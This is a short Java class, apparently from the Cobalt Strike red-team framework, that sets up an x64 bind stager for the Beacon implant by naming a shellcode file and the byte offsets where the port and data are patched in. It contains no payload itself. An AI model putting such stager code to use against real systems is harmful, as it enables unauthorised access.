package stagers;

import common.Listener;

public class BeaconBindStagerX64
        extends GenericBindStager {
    public BeaconBindStagerX64(Listener l) {
        super(l);
    }

    @Override
    public String arch() {
        return "x64";
    }

    @Override
    public String getFile() {
        return "resources/bind64.bin";
    }

    @Override
    public int getPortOffset() {
        return 240;
    }

    @Override
    public int getDataOffset() {
        return 488;
    }
}

